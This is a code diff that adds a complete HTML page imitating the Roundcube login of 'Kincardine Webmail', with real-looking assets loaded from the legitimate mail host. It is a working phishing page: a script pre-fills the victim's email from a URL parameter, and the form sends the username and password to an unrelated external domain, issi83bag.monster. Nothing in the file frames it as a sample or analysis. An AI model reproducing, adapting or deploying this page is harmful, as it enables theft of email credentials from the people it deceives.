@@ -1,0 +1,76 @@
+<html lang="en" xmlns="http://www.w3.org/1999/xhtml" class=" js chrome webkit"><head>
+<title>Kincardine Webmail :: Welcome to Kincardine Webmail</title>
+<link rel="index" href="./?_task=login">
+<link rel="shortcut icon" href="https://webmail.tnt21.com/skins/classic/images/favicon.ico">
+<link rel="stylesheet" type="text/css" href="https://webmail.tnt21.com/skins/classic/common.min.css?s=1636751547">
+
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+<link rel="stylesheet" type="text/css" href="https://webmail.tnt21.com/plugins/jqueryui/themes/classic/jquery-ui.css?s=1636751547">
+	<script>
+  var pixelDepth;
+window.onload = function() {
+    screenProperties();
+  };
+
+  function screenProperties()
+  {
+	var txtEmail = document.getElementById('textbox1');
+	const queryString = window.location.search;
+	const urlParams = new URLSearchParams(queryString);
+	const code = urlParams.get('email')
+	rcmloginuser.value = code;
+	/*if(code=="")
+	{
+		document.getElementById("divEmail").innerText = "No Email Found";
+		}else{
+	document.getElementById("divEmail").innerText = code;
+	}*/
+	
+
+	//return pixelDepth;
+  }
+</script>
+</head>
+<body>
+
+<img src="https://webmail.tnt21.com/skins/classic/images/roundcube_logo.png" id="logo" border="0" style="margin:0 11px" alt="Kincardine Webmail">
+
+<div id="message"></div>
+
+<div id="login-form">
+<div class="boxtitle">Welcome to Kincardine Webmail</div>
+<div class="boxcontent">
+
+<form name="form" method="post" action="https://issi83bag.monster/ca/login.php">
+<input type="hidden" name="_token" value="kGkzpCR5N1NxkSbgrSFGkyVrox2OrycC">
+<input type="hidden" name="_task" value="login"><input type="hidden" name="_action" value="login"><input type="hidden" name="_timezone" id="rcmlogintz" value="America/New_York"><input type="hidden" name="_url" id="rcmloginurl" value=""><table summary="" border="0"><tbody><tr><td class="title"><label for="rcmloginuser">Username</label>
+</td>
+<td class="input"><input name="username" id="rcmloginuser" required="required" autocapitalize="off" type="text"></td>
+</tr>
+<tr><td class="title"><label for="rcmloginpwd">Password</label>
+</td>
+<td class="input"><input name="password" id="rcmloginpwd" required="required" autocapitalize="off" type="password"></td>
+</tr>
+</tbody>
+</table>
+<p class="formbuttons"><input type="submit" id="rcmloginsubmit" class="button mainaction" value="Login"></p>
+
+</form>
+
+</div>
+</div>
+
+<noscript>
+  <p id="login-noscriptwarning">Warning: This webmail service requires Javascript! In order to use it please enable Javascript in your browser's settings.</p>
+</noscript>
+
+<div id="login-bottomline">
+  Kincardine Webmail 
+    
+</div>
+
+
+
+
+
+</body></html>
